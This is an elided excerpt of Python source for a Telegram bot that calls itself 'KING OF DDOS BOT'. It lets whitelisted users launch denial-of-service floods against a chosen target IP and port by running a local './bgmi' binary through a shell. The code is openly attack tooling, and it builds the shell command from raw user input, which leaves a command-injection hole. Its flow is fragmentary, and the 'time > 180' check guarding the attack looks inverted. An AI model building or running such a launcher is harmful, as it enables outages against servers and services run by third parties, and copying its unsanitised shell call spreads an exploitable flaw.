...
def start_attack_reply(message, target, port, time, threads):
    ...
    response = (f"𝐊𝐈𝐍𝐆 𝐎𝐅 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓\n\n"
                f"@{username}, 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊\n\n"
                f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} Seconds\n"
                f"𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI")
    bot.reply_to(message, response)
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        command = message.text.split()
        if len(command) == 5:  # Updated to accept target, port, time, and threads
            target = command[1]
            ...
            if time > 180:
                ...
                record_command_logs(user_id, '/bgmi', target, port, time, threads)
                ...
                full_command = f"./bgmi {target} {port} {time} {threads} 200"
                subprocess.run(full_command, shell=True)
                response = (f"𝒀𝑶𝑼𝑹 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑰𝑵𝑰𝑺𝑯𝑬𝑫. \n\n"
                            f"Target: {target}\nPort: {port}\nTime: {time} Seconds\nThreads: {threads}")
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time> <threads>"  # Updated command syntax
    else:
